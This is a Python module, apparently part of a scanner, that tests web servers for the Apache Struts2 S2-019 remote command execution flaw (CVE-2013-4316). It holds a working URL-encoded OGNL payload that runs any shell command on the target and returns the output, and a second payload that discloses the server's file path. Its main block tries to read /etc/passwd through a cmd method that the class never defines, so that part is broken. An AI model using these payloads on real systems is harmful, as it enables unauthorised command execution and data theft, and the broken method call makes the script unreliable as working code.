#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_019_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2013-4316',
            'description': 'Struts2 S2-019漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.15.1',
            'date': '2013-09-09',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload = '''?debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22{cmd}%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
        self.path_payload = '''?debug=command&expression=%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding('{encoding}')%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()'''

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
            if self.capta in await check_req.text() and len(await check_req.text()) < 200:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_019 = S2_019_BaseVerify('http://127.0.0.1:8080/S2-019/example/HelloWorld.action')
    print(S2_019.cmd('cat /etc/passwd')[1])
    
